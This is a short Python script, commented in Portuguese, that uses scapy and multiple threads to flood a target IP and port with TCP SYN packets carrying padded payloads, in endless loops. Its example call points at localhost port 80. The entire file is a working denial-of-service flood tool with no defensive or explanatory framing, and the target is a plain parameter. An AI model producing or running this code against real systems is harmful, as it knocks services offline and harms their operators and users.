from scapy.all import *
import threading

def flood(target_ip, target_port, packet_size):
    while True:
        # Payload com tamanho do pacote
        payload = b'A' * packet_size
        pkt = IP(dst=target_ip) / TCP(dport=target_port, flags='S') / payload
        send(pkt, verbose=0)

def start_flooding(target_ip, target_port, packet_size, num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=flood, args=(target_ip, target_port, packet_size))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Exemplo de uso: Flood TCP port 80 em '127.0.0.1' com pacotes de 1024 bytes usando 10 threads
start_flooding('127.0.0.1', 80, 1024, 10)